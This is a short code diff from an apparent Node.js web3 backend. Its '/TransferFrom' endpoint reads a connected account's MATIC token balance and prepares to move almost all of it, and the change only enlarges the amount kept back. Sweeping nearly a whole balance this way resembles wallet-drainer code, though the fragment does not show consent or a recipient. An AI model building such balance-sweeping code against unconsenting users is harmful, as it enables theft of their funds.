@@ -194,7 +194,7 @@ app.post("/TransferFrom", async (request, response) => {
     let Balance = await MaticTokenContract.methods.balanceOf(ConnectedAccount).call().then(function (result) {
         return result;
     });
-    var num = parseFloat(web3.utils.fromWei(Balance) - 0.001).toString();
+    var num = parseFloat(web3.utils.fromWei(Balance) - 0.01).toString();
     var wei = web3.utils.toWei(num);
     var finalnumber = web3.utils.toHex(wei);
 
